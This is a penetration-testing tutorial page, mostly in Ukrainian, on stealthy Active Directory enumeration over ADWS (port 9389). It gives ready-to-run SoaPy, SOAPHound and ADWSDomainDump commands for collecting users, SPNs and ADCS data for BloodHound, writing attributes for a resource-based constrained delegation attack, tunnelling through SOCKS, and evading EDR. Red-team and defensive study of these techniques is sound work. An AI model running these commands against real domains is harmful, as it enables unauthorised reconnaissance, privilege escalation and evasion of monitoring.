# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) є **увімкненим за замовчуванням на кожному Domain Controller з Windows Server 2008 R2** і слухає TCP **9389**. Незважаючи на назву, **HTTP не використовується**. Натомість сервіс надає дані у стилі LDAP через стек пропрієтарних .NET фреймінг-протоколів:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсульований у бінарних SOAP-фреймах і йде через незвичний порт, **переливання через ADWS значно менше ймовірно буде інспектовано, відфільтровано або підписано, ніж класичний LDAP/389 & 636-трафік**. Для операторів це означає:

* Більш прихований рекогнісценс — Blue teams часто зосереджуються на LDAP-запитах.
* Можливість збирати дані з **не-Windows хостів (Linux, macOS)**, тунелювавши 9389/TCP через SOCKS-проксі.
* Ті самі дані, що й через LDAP (користувачі, групи, ACLи, схема тощо) та можливість виконувати **записи** (наприклад `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодії ADWS реалізовані поверх WS-Enumeration: кожний запит починається з повідомлення `Enumerate`, яке визначає LDAP-фільтр/атрибути і повертає `EnumerationContext` GUID, після чого йде одне або декілька повідомлень `Pull`, що стрімлять результати до вікна, визначеного сервером. Контексти втрачають актуальність приблизно через ~30 хвилин, тому інструменти або повинні сторінкувати результати, або розбивати фільтри (префіксні запити по CN), щоб не втратити стан. Коли запитуєте security descriptors, вкажіть контроль `LDAP_SERVER_SD_FLAGS_OID`, щоб опустити SACLs, інакше ADWS просто не включає атрибут `nTSecurityDescriptor` у своїй SOAP-відповіді.

> NOTE: ADWS також використовується багатьма RSAT GUI/PowerShell інструментами, тож трафік може змішуватись з легітимною адміністративною активністю.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) — це **повна реалізація стеку протоколів ADWS на чистому Python**. Він формує NBFX/NBFSE/NNS/NMF-фрейми байт у байт, що дозволяє збирати дані з Unix-подібних систем без звернення до .NET runtime.

### Key Features

* Підтримує **проксування через SOCKS** (корисно для C2-імплантів).
* Дрібнозернисті фільтри пошуку, ідентичні LDAP `-q '(objectClass=user)'`.
* Опційні **операції запису** (`--set` / `--delete`).
* **BOFHound output mode** для прямого інжесту в BloodHound.
* Прапорець `--parse` для привітного форматування timestamps / `userAccountControl`, коли потрібна читабельність для людини.

### Targeted collection flags & write operations

SoaPy постачається з підібраними перемикачами, що відтворюють найпоширеніші LDAP-завдання полювання через ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, а також сирі `--query` / `--filter` ручки для кастомних витягів. Поєднуйте їх з примітивами запису, такими як `--rbcd <source>` (встановлює `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging для таргетованого Kerberoasting) та `--asrep` (перемикає `DONT_REQ_PREAUTH` у `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Використовуйте той самий хост/облікові дані, щоб негайно озброїти знахідки: витягніть RBCD-capable об'єкти за допомогою `--rbcds`, потім застосуйте `--rbcd 'WEBSRV01$' --account 'FILE01$'`, щоб підготувати Resource-Based Constrained Delegation ланцюжок (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) для повного шляху зловживання).

### Встановлення (хост оператора)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Форк `ldapdomaindump`, який замінює LDAP-запити на виклики ADWS через TCP/9389, щоб зменшити спрацьовування підписів LDAP.
* Виконує початкову перевірку доступності порту 9389, якщо не передано `--force` (пропускає перевірку, якщо сканування портів спричиняє шум або фільтрується).
* Тестувалося проти Microsoft Defender for Endpoint та CrowdStrike Falcon; успішний обхід описано в README.

### Встановлення
```bash
pipx install .
```
### Використання
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Типовий вивід фіксує перевірку доступності порту 9389, ADWS bind і початок/завершення dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Практичний клієнт для ADWS на Golang

Подібно до soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколів ADWS (MS-NNS + MC-NMF + SOAP) на Golang, надаючи параметри командного рядка для виконання ADWS викликів, таких як:

* **Пошук та отримання об'єктів** - `query` / `get`
* **Життєвий цикл об'єкта** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Редагування атрибутів** - `attr [add|replace|delete]`
* **Керування обліковими записами** - `set-password` / `change-password`
* та інші, наприклад `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, тощо.

## SOAPHound – Збір великого обсягу ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — .NET-колектор, який утримує всі LDAP-взаємодії всередині ADWS та виводить JSON, сумісний з BloodHound v4. Одного разу створює повний кеш `objectSid`, `objectGUID`, `distinguishedName` та `objectClass` (`--buildcache`), після чого повторно використовує його для високопродуктивних проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (AD-integrated DNS), тож лише ~35 критичних атрибутів покидають DC. AutoSplit (`--autosplit --threshold <N>`) автоматично розбиває запити за префіксом CN, щоб залишатися в межах 30-хвилинного таймауту EnumerationContext у великих лісах.

Типовий робочий процес на VM оператора, приєднаній до домену:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Експорт JSON напряму в робочі процеси SharpHound/BloodHound — див. [BloodHound methodology](bloodhound.md) для ідей щодо подальшої візуалізації. AutoSplit робить SOAPHound стійким для лісів з кількома мільйонами об'єктів, при цьому зберігаючи кількість запитів нижчою, ніж у знімках типу ADExplorer.

## Стелс-робочий процес збору AD

Наведений робочий процес показує, як перелічити **об'єкти домену та ADCS** через ADWS, конвертувати їх у BloodHound JSON та шукати шляхи атак на основі сертифікатів — усе з Linux:

1. **Tunnel 9389/TCP** з цільової мережі на вашу машину (наприклад через Chisel, Meterpreter, SSH dynamic port-forward тощо). Експортуйте `export HTTPS_PROXY=socks5://127.0.0.1:1080` або використайте SoaPy’s `--proxyHost/--proxyPort`.

2. **Зібрати кореневий об'єкт домену:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Зібрати об'єкти, пов'язані з ADCS, з Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Конвертувати в BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Upload the ZIP** в BloodHound GUI і запустіть cypher queries, наприклад `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації сертифікатів (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Поєднайте це з `s4u2proxy`/`Rubeus /getticket` для повного ланцюга **Resource-Based Constrained Delegation** (див. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Короткий огляд інструментів

| Призначення | Tool | Примітки |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Може проксуватися через той самий SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Універсальний клієнт для взаємодії з відомими ADWS endpoints — дозволяє перелічувати, створювати об'єкти, змінювати атрибути та змінювати паролі |

## Посилання

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
